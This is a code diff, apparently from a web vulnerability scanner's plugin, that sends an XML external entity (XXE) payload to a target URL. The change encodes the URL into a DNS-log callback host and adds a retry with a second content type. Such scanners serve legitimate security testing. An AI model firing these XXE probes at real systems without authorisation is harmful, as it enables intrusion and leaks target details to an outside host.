@@ -3,6 +3,7 @@
 
 
 import requests
+import base64
 import urlparse
 from config import *
 
@@ -21,7 +22,9 @@ def verify(task):
         path = "/".join(path.split("/")[:-1])
     else:
         path = path
-    target = prefix + _.netloc.replace(".", "_") + path.replace("/", "_") + dnslog
+    #target = prefix + _.netloc.replace(".", "_") + path.replace("/", "_") + dnslog
+    target = prefix + base64.b64encode(url).replace('=', '') + dnslog
+
     logger.info("[xxe] [target={}]".format(target))
 
     xxe_xml = XXE_payload.format(target)
@@ -29,6 +32,12 @@ def verify(task):
     headers["Content-Type"] = "application/xml"
     try:
         requests.post(task["url"],data=xxe_xml, headers=headers)
+    except Exception as e:
+        logger.error("[xxe] [error={}]".format(repr(e)))
+
+    headers['Content-Type'] = 'text/xml'
+    try:
+        requests.post(task['url'], data=xxe_xml, headers=headers)
     except Exception as e:
         logger.error("[xxe] [error={}]".format(repr(e)))
     return (False, {})
